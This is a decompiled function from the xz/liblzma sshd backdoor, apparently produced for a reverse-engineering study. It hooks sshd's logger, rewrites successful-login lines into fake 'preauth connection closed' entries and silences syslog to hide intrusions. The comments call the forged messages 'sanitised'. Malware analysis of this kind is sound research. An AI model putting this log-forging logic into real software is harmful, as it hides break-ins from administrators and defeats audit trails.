// /home/kali/xzre-ghidra/xzregh/10A3A0_mm_log_handler_hook.c
// Function: mm_log_handler_hook @ 0x10A3A0
// Calling convention: __stdcall
// Prototype: void __stdcall mm_log_handler_hook(LogLevel level, int forced, char * msg, void * ctx)


/*
 * AutoDoc: Interposes on sshd's log handler, bailing out entirely when logging has been globally disabled or sshd already dropped
 * privileges back to the sandbox. In filtering mode it scans the formatted string for the `"Connection closed by ...
 * (preauth)"` pattern, rebuilds a safe replacement message from attacker-provided format strings, and emits it through
 * `sshd_log()` while optionally muting syslog via the saved libc pointers. Messages that mention accepted authentication
 * events trigger a second rewrite path so only the sanitised strings ever reach sshd's real logger.
 */

#include "xzre_types.h"

void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)

{
  char *string_cursor;
  BOOL syslog_mask_was_enabled;
  sshd_log_ctx_t *log_ctx_state;
  libc_imports_t *libc_imports;
  EncodedStringId string_id;
  ssize_t msg_len;
  long lVar6;
  long lVar7;
  ulong uVar8;
  char *pcVar9;
  undefined4 *puVar10;
  char *pcVar11;
  char *host_fragment_start;
  char *user_fragment_start;
  ulong host_fragment_len;
  ulong user_fragment_len;
  u8 zero_seed;
  char rewritten_msg [320];
  sshd_log_ctx_t *log_ctx;
  log_handler_fn sshlog_impl;
  u64 filtered_host_chunk0;
  u64 filtered_host_chunk1;
  uint filtered_host_words[60];
  u64 user_fragment_chunk0;
  u64 user_fragment_chunk1;
  uint user_fragment_words[60];
  u64 prefix_chunk0;
  u64 prefix_chunk1;
  uint prefix_word;
  char authenticating_label[14];
  uchar label_space;
  char user_label[4];
  uchar user_space;
  char percent_s_head0;
  char percent_s_head1;
  uchar percent_s_padding;
  char percent_s_tail0;
  char percent_s_tail1;
  ushort open_bracket_padding;
  char preauth_label[7];
  uchar closing_bracket_char;
  
  zero_seed = 0;
  log_ctx_state = *(sshd_log_ctx_t **)(global_ctx + 0x30);
  libc_imports = *(long *)(global_ctx + 0x10);
  filtered_host_chunk0 = 0;
  filtered_host_chunk1 = 0;
  puVar10 = filtered_host_words;
  for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  user_fragment_chunk0 = 0;
  user_fragment_chunk1 = 0;
  puVar10 = user_fragment_words;
  for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  prefix_chunk0 = 0;
  prefix_chunk1 = 0;
  puVar10 = &prefix_word;
  for (lVar7 = 0x7c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  if (msg != (char *)0x0) {
    // AutoDoc: Respect the payload’s "logging disabled" flag—once set, every log request immediately bails.
    if (log_ctx_state->log_squelched == TRUE) {
      return;
    }
    if (*(int *)(global_ctx + 0x90) != 0) {
      return;
    }
    if ((log_ctx_state->saved_log_handler != (log_handler_fn)0x0) &&
       (log_ctx_state->saved_log_handler_ctx == (void *)0x0)) {
      return;
    }
    msg_len = c_strlen(msg);
    string_cursor = msg + msg_len;
    while( TRUE ) {
      if (string_cursor <= msg) {
        return;
      }
      string_id = get_string_id(msg,string_cursor);
      if (string_id == STR_Connection_closed_by) break;
      // AutoDoc: Track log lines announcing a successful authentication so the hook can harvest the username/host fragments for rewriting.
      if ((string_id == STR_Accepted_password_for) || (string_id == STR_Accepted_publickey_for)) {
        user_fragment_start = msg + 0x17;
        if (string_id == STR_Accepted_password_for) {
          user_fragment_start = msg + 0x16;
        }
        host_fragment_len = 0;
        host_fragment_start = (char *)0x0;
        user_fragment_len = 0;
        goto LAB_0010a504;
      }
      msg = msg + 1;
    }
    prefix_chunk0 = CONCAT62((prefix_chunk0 >> 16),*(undefined2 *)log_ctx_state->fmt_percent_s);
    log_ctx_state->log_squelched = TRUE;
    // AutoDoc: Temporarily force `setlogmask(0xff)` whenever syslog suppression is enabled so sshd’s own handler stays quiet while we inject a sanitized line.
    if (((log_ctx_state->syslog_mask_applied != FALSE) && (libc_imports != 0)) &&
       (*(code **)(libc_imports + 0x58) != (code *)0x0)) {
      (**(code **)(libc_imports + 0x58))(0xff);
    }
    sshd_log(log_ctx_state,level,(char *)&prefix_chunk0,msg);
    syslog_mask_was_enabled = log_ctx_state->syslog_mask_applied;
    goto joined_r0x0010a4c2;
  }
  goto LAB_0010a6da;
LAB_0010a504:
  do {
    string_id = get_string_id(msg,string_cursor);
    if (string_id == STR_ssh2) {
      if (host_fragment_start != (char *)0x0) {
        host_fragment_len = (long)msg - (long)host_fragment_start;
        uVar8 = host_fragment_len;
        pcVar9 = host_fragment_start;
        pcVar11 = (char *)&filtered_host_chunk0;
        if (0xff < host_fragment_len) goto LAB_0010a6da;
        for (; uVar8 != 0; uVar8 = uVar8 - 1) {
          *pcVar11 = *pcVar9;
          pcVar9 = pcVar9 + (ulong)zero_seed * -2 + 1;
          pcVar11 = pcVar11 + (ulong)zero_seed * -2 + 1;
        }
      }
    }
    else if (string_id == STR_from) {
      user_fragment_len = (long)msg - (long)user_fragment_start;
      if (0xff < user_fragment_len) goto LAB_0010a6da;
      host_fragment_start = msg + 6;
      pcVar9 = user_fragment_start;
      pcVar11 = (char *)&user_fragment_chunk0;
      for (uVar8 = user_fragment_len; uVar8 != 0; uVar8 = uVar8 - 1) {
        *pcVar11 = *pcVar9;
        pcVar9 = pcVar9 + (ulong)zero_seed * -2 + 1;
        pcVar11 = pcVar11 + (ulong)zero_seed * -2 + 1;
      }
    }
    msg = msg + 1;
  } while (msg < string_cursor);
  // AutoDoc: Only rebuild the "Connection closed by … (preauth)" string once both the username and host fragments were captured.
  if ((user_fragment_len != 0) && (host_fragment_len != 0)) {
    string_cursor = log_ctx_state->str_connection_closed_by;
    lVar7 = 0;
    do {
      lVar6 = lVar7 + 1;
      *(char *)((long)&prefix_chunk0 + lVar7) = string_cursor[lVar7];
      lVar7 = lVar6;
    } while (lVar6 != 0x15);
    string_cursor = log_ctx_state->str_authenticating;
    lVar7 = 0;
    do {
      authenticating_label[lVar7] = string_cursor[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 0xe);
    label_space = 0x20;
    string_cursor = log_ctx_state->str_user;
    lVar7 = 0;
    do {
      user_label[lVar7] = string_cursor[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 4);
    user_space = 0x20;
    percent_s_head0 = *log_ctx_state->fmt_percent_s;
    percent_s_head1 = log_ctx_state->fmt_percent_s[1];
    percent_s_padding = 0x20;
    percent_s_tail0 = *log_ctx_state->fmt_percent_s;
    percent_s_tail1 = log_ctx_state->fmt_percent_s[1];
    open_bracket_padding = 0x5b20;
    string_cursor = log_ctx_state->str_preauth;
    lVar7 = 0;
    do {
      preauth_label[lVar7] = string_cursor[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 7);
    closing_bracket_char = 0x5d;
    log_ctx_state->log_squelched = TRUE;
    if (((log_ctx_state->syslog_mask_applied != FALSE) && (libc_imports != 0)) &&
       (*(code **)(libc_imports + 0x58) != (code *)0x0)) {
      (**(code **)(libc_imports + 0x58))(0xff);
    }
    sshd_log(log_ctx_state,SYSLOG_LEVEL_INFO,(char *)&prefix_chunk0,&user_fragment_chunk0,&filtered_host_chunk0);
    syslog_mask_was_enabled = log_ctx_state->syslog_mask_applied;
joined_r0x0010a4c2:
    if (syslog_mask_was_enabled == FALSE) {
      return;
    }
    if (libc_imports == 0) {
      return;
    }
    if (*(code **)(libc_imports + 0x58) == (code *)0x0) {
      return;
    }
    // AutoDoc: Restore sshd’s original syslog mask after the sanitized message has been emitted.
    (**(code **)(libc_imports + 0x58))(0x80000000);
    return;
  }
LAB_0010a6da:
  log_ctx_state->log_squelched = TRUE;
  return;
}

